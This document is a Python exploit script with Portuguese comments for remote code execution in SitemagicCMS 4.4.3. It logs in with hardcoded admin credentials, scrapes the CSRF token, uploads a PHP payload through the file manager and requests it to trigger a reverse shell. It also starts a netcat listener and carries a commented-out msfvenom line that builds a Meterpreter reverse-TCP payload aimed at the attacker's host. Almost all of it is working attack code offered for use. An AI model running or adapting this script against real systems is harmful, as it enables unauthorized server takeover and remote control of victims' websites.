#Exploit Title: SitemagicCMS 4.4.3 Remote Code Execution (RCE)
#Application: SitemagicCMS
#Version: 4.4.3
#Bugs:  RCE
#Technology: PHP
#Vendor URL: https://sitemagic.org/Download.html
#Software Link: https://github.com/Jemt/SitemagicCMS
#Date of found: 14-05-2023
#Author: Mirabbas Ağalarov
#Tested on: Linux 
#Dev : Leandro Santos
#ADD Bugs: RCE,LFI,IFU,SHELL


"""POST /index.php?SMExt=SMLogin HTTP/1.1
Host: kb.vuln
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 216
Origin: http://kb.vuln
Connection: keep-alive
Referer: http://kb.vuln/index.php?SMExt=SMLogin
Cookie: SM#/#smFieldsetVisibleSMConfigDatabase=true; SM#/#smFieldsetVisibleSMConfigSmtp=false; SMSESSION9bc89c4c428f1fec=uhusn7jdb1ftngj46up9bn88p6
Upgrade-Insecure-Requests: 1

SMInputSMLoginUsername=admin&SMInputSMLoginPassword=jesse&SMOptionListSMLoginLanguages%5B%5D=en&SMInputSMSearchValue8477222=&SMPostBackControl=SMLinkButtonSMLoginSubmit&SMRequestToken=93b497fe03fd35197c3142a5e5e0e8baHTTP/1.1 302 Found"""
#--------------------------------------------------------------------------------------------------------------------------3

"""POST /index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files%2Fimages HTTP/1.1
Host: kb.vuln
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------394943281129193476921742258028
Content-Length: 34062
Origin: http://kb.vuln
Connection: keep-alive
Referer: http://kb.vuln/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files%2Fimages
Cookie: SM#/#smFieldsetVisibleSMConfigDatabase=true; SM#/#smFieldsetVisibleSMConfigSmtp=false; SMSESSION9bc89c4c428f1fec=uhusn7jdb1ftngj46up9bn88p6
Upgrade-Insecure-Requests: 1

-----------------------------394943281129193476921742258028
Content-Disposition: form-data; name="SMInputSMFilesUpload"; filename="bg.jpg"
Content-Type: image/jpeg"""
#--<div><input id="SMPostBackControl" name="SMPostBackControl" type="hidden"/><input name="SMRequestToken" type="hidden" value="b8b30257578e3e5a8ebbf0c056beac80"/></div>
import lxml
import os
import random
import requests
import re
import logging
import argparse
from datetime import datetime
from bs4 import BeautifulSoup
from requests_toolbelt.multipart import MultipartEncoder
from multiprocessing import Process

        
class Exploit:


    def __init__(self):

        self.parser = argparse.ArgumentParser(description="TEST")
        self._add_arguments()
        self.session = requests.Session()
        self.cookie = {'SM#/#smFieldsetVisibleSMConfigDatabase': 'true',
                       'SM#/#smFieldsetVisibleSMConfigSmtp': 'false',
                       'SMSESSION9bc89c4c428f1fec': 'uhusn7jdb1ftngj46up9bn88p6'}

        self.headers = {
            'Host': 'kb.vuln',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': 'http://kb.vuln/'
        }
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)

        formatter = logging.Formatter('\033[93m''%(levelname)s %(asctime)s %(message)s',
                                            datefmt='%m/%d/%Y %I:%M:%S %p''\033[32m')

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)
        ch.setFormatter(formatter)

        self.logger.addHandler(ch)
        fh = logging.FileHandler(f"{datetime.today().strftime('%A, %B %d, %Y')}.log")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(formatter)

        self.logger.addHandler(fh)
       
    def _add_arguments(self):
        self.parser.add_argument('--lhost', type=str, required=True, help='Endereço IP local para conexão reversa')
        self.parser.add_argument('--lport', type=int, required=True, help='Porta local para conexão reversa')
        self.parser.add_argument('--file', required=True)
        self.parser.add_argument('--timeout', type=int, default=5, help='Timeout para reconexão (em milissegundos)')
        self.parser.add_argument('--message', type=str, default="Connected!", help='Mensagem de conexão')
        self.parser.add_argument('--url', type=str, required=True, help='URL para enviar o payload via requisição HTTP')
        self.parser.add_argument('--processes', type=int, default=1, help='Número de processos para enviar o payload e escutar conexões')


    def parse_arguments(self):
        
        self.args = self.parser.parse_args()
       

    
    def get_csrf_token(self):
        # Obter a página inicial para capturar o token CSRF
        response = self.session.get(url='http://kb.vuln/', headers=self.headers, cookies=self.cookie, verify=False)
        soup = BeautifulSoup(response.text, 'lxml')
        token_input = soup.find('input', {'name': 'SMRequestToken'})

        # Verificar se o token foi encontrado e extrair o valor
        if token_input:
            return token_input['value']
        else:
            raise ValueError("Token CSRF não encontrado na página.")

    def autenticator(self):
        # Captura o token CSRF
        token = self.get_csrf_token()
        print(f"Token CSRF capturado: {token}")

        # Define os dados de login com o token CSRF
        login_data = {
            'SMInputSMLoginUsername': 'admin',
            'SMInputSMLoginPassword': 'jesse',
            'SMOptionListSMLoginLanguages%5B%5D': 'en',
            'SMInputSMSearchValue8477222': '',
            'SMPostBackControl': 'SMLinkButtonSMLoginSubmit',
            'SMRequestToken': token
        }

        try:
            # Realiza a requisição POST de login
            req = self.session.post(
                url='http://kb.vuln/index.php?SMExt=SMLogin',
                headers=self.headers,
                data=login_data,
                cookies=self.cookie,  # Usar 'cookie' ao invés de 'coockie'
                verify=False,
                allow_redirects=False  # Não seguir automaticamente o redirecionamento
            )

            # Imprimir informações da resposta
            self.logger.info(f"Código de status HTTP: {req.status_code}")
            #self.logger.debug(f"Cabeçalhos de resposta: {req.headers}")
            #print(f"Cookies após login: {self.session.cookies.get_dict()}")

            # Verificar se o redirecionamento é para a página de sucesso
            if req.status_code == 302 and 'location' in req.headers:
                self.logger.warning(f"Login bem-sucedido, redirecionando para: {req.headers['location']}")

                # Seguir manualmente o redirecionamento
                redirect_url = f"http://kb.vuln/{req.headers['location']}"
                redirect_response = self.session.get(redirect_url, headers=self.headers, cookies=self.cookie, verify=False)

                # Verificar se a página de destino contém "Log out" indicando sucesso
                soup = BeautifulSoup(redirect_response.text, 'lxml')
                tpl_links_div = soup.find('div', {'class': 'TPLLinks'})

                if tpl_links_div and 'Log out' in tpl_links_div.text:
                    self.logger.warning("Login bem-sucedido! O link 'Log out' foi encontrado.")
                    return True
                else:
                    self.logger.error("Falha ao redirecionar para a página pós-login.")
                    return False

            else:
                self.logger.error("Falha no login: Código de status diferente de 302 ou cabeçalho 'location' ausente.")
                return False

        except Exception as e:
            self.logger.error(f"Erro durante o processo de autenticação: {e}")
            return False

    #def generate_payload(self):
       #if os.name != 'nt':

            #payload = os.system(f'msfvenom -p php/meterpreter_reverse_tcp LPORT={self.args.lport} LHOST={self.args.lhost} -f raw > info.php')
            
            #self.logger.warning(payload)



    def upload_payload(self):
        # Obter o token CSRF antes de fazer o upload
        csrf_token = self.get_csrf_token()

        # Preparação do arquivo para upload
        try:
            file_path = self.args.file  # Certifique-se de que self.args.file contém o caminho correto do arquivo
            file_name = "info.php"  # Nome do arquivo como será salvo no servidor

            # Confirme que o arquivo existe antes de abrir
            if not os.path.isfile(file_path):
                raise FileNotFoundError(f"Arquivo não encontrado: {file_path}")

            # Configuração do MultipartEncoder com o nome do campo correto, o arquivo, e o token CSRF
            multipart_data = MultipartEncoder(
                fields={
                    "SMInputSMFilesUpload": (file_name, open(file_path, "rb"), "application/php"),
                    "SMRequestToken": csrf_token,  # Inclua o token CSRF aqui
                    # Adicione outros campos se necessário
                }
            )

            # Adiciona o tipo de conteúdo gerado pelo MultipartEncoder aos cabeçalhos
            self.headers['Content-Type'] = multipart_data.content_type

            # Realiza o upload do payload
            response = self.session.post(
                url='http://kb.vuln/index.php?SMExt=SMFiles&SMTemplateType=Basic&SMExecMode=Dedicated&SMFilesUpload&SMFilesUploadPath=files',
                headers=self.headers,
                cookies=self.cookie,  # Certifique-se de que `self.cookie` está correto
                data=multipart_data,  # Inclui os dados do arquivo
                verify=False,
                allow_redirects=True
            )

            # Verifica se o upload foi bem-sucedido
            if response.status_code == 200:
                self.logger.critical("Upload realizado com sucesso!")
                #print(f"Resposta do servidor: {response.text}")
            else:
                self.logger.error(f"Falha no upload: Código de status {response.status_code}")
                self.logger.error(f"Resposta do servidor: {response.text}")

        except FileNotFoundError as e:
            self.logger.error(f"Erro: {e}")
        except Exception as e:
            self.logger.error(f"Erro durante o upload do payload: {e}")


    def get_reverse_shell(self):
        
            send = self.session.get(
                    url=f'http://kb.vuln/files/{self.args.file}',
                    headers=self.headers,
                    cookies=self.cookie,
                    verify=False,
                    allow_redirects=True
                )
    def start_listener(self):
      
        os.system(f"rlwrap nc -vlp {self.args.lport}")
                   
    def run(self):      
        
       
        self.logger.info("[i]Reply : https://www.linkedin.com/in/leandro-henrique-ohms/")
        self.logger.info("[i]Referer : https://www.exploit-db.com/exploits/51464")
        self.logger.warning("[i]Sitemagic CMS 4.4.3 RCE,LFI,IFU + [i]CVE: N/A Date:2023-05-23")
        self.logger.warning("[+] LHOST = %s" % (self.args.lhost))
        self.logger.warning("[+] LPORT = %d" % (self.args.lport))
        
        # Process para autenticação
        auth_process = Process(target=app.autenticator)
        auth_process.start()
        auth_process.join()  # Espera o processo de autenticação terminar

        # Depois que a autenticação é bem-sucedida, prossegue com o upload
        upload_process = Process(target=app.upload_payload)
        upload_process.start()
        upload_process.join()  # Espera o upload ser concluído

        # Em seguida, tenta obter um shell reverso
        
        get_process = Process(target=app.get_reverse_shell)
        get_process.start()
            
        # Inicia o listener para conexões reversas
        listen_process = Process(target=app.start_listener)
        listen_process.start()
        

            
            
if __name__ == "__main__":
     
    ascii_banner = ["""
    .              +   .                .   . .     .  .
                   .                    .       .     *
  .       *                        . . . .  .   .  + .    +
            "This is Universe                              +   0 .
            You Are Here"            .   .  +  . . .   .     * . . . . . . . . .* . . .*
.                 |             .  .   .    .    . . .  . . . . . . .  . .+ . . . . . . *
                  |           .     .     . +.    +  .     . +  .   .  .   .  .  .  .  .  .. 
                 \|/            .       .   . .
        . .       V          .    * . . .  . * +   .  . .    *   .+ . . ..  . . * . . . .
           +      .           .   .      +. . .   +.  *
                            .       . +  .+. . & . .  .    .          .     . *
  .                      .     . + .  . .     .      . . . . . . . .*  . . . . . . . .  + . . . . . . *
           .      .    .     . .   . . .        ! /       .. . . . . . . . . . . . . + .. .  . . . .  . . 
      *             .    . .  +    .  .       - O -       + . . . . . . . . .. .. * . . .* . . . . ..  . .
          .     .    .  +   . .  *  .       . / |      * . . . . +  * . . . . . . .. ... . * . . . .. . ..
               . + .  .  .  .. +  .
.      .  .  .  *   .  *  . +..  .            * . . . .     . .. +     + . . . . .. . . 0 . .. . . . .
 .      .   . .   .   .   . .  +   .    .            + . . . . . . ..  * . . . .. + ..... .. . .* . ..+
        
                  """,
                  """⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣭⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⠤⢤⣀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠒⢋⣉⣀⣠⣄⣀⣈⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣯⠴⠚⠉⠉⠀⠀⠀⠀⣤⠏⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⡇⠁⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⡿⠿⢛⠁⠁⣸⠀⠀⠀⠀⠀⣤⣾⠵⠚⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⡀⠀⣠⠀⡇⢧⠀⠀⢀⣠⡾⡇⠀⠀⠀⠀⠀⣠⣴⠿⠋⠁⠀⠀⠀⠀⠘⣿⠀⣀⡠⠞⠛⠁⠂⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⣻⡦⣞⡿⣷⠸⣄⣡⢾⡿⠁⠀⠀⠀⣀⣴⠟⠋⠁⠀⠀⠀⠀⠐⠠⡤⣾⣙⣶⡶⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣂⡷⠰⣔⣾⣖⣾⡷⢿⣐⣀⣀⣤⢾⣋⠁⠀⠀⠀⣀⢀⣀⣀⣀⣀⠀⢀⢿⠑⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡦⠴⠴⠤⠦⠤⠤⠤⠤⠤⠴⠶⢾⣽⣙⠒⢺⣿⣿⣿⣿⢾⠶⣧⡼⢏⠑⠚⠋⠉⠉⡉⡉⠉⠉⠹⠈⠁⠉⠀⠨⢾⡂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠂⠐⠀⠀⠀⠈⣇⡿⢯⢻⣟⣇⣷⣞⡛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣆⠀⠀⠀⠀⢠⡷⡛⣛⣼⣿⠟⠙⣧⠅⡄⠀⠀⠀⠀⠀⠀⠰⡆⠀⠀⠀⠀⢠⣾⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢶⠏⠉⠀⠀⠀⠀⠀⠿⢠⣴⡟⡗⡾⡒⠖⠉⠏⠁⠀⠀⠀⠀⣀⢀⣠⣧⣀⣀⠀⠀⠀⠚⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢴⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⣠⣷⢿⠋⠁⣿⡏⠅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⣿⢭⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢏⡵⠛⠀⠀⠀⠀⠀⠀⠀⣀⣴⠞⠛⠀⠀⠀⠀⢿⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢿⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⠛⣲⡏⠁⠀⠀⠀⠀⠀⢀⣠⡾⠋⠉⠀⠀⠀⠀⠀⠀⢾⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠟⠀⢰⡯⠄⠀⠀⠀⠀⣠⢴⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡾⠁⠁⠀⠘⠧⠤⢤⣤⠶⠏⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠂⢀⣀⣀⠤⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠄⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""]
    
    
    app = Exploit()
    app.logger.warning('\033[96m'+ ascii_banner[0] +'\033[96m')
    app.parse_arguments()
    app.run()
    


    





